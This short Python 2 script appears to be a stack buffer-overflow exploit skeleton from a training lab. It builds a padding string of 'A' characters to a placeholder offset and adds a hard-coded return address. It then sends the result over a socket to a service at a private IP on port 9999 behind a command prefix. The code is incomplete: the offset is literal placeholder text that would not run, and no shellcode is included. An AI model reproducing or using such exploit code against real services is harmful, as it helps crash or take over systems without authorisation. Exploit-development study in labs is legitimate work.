#!/usr/bin/python
import sys, socket

shellcode = "A" * "OFFSET VALUE HERE" + "\xaf\x11\x50\x62"

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.221',9999))
        s.send(('COMMAND  /.:/' + shellcode))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
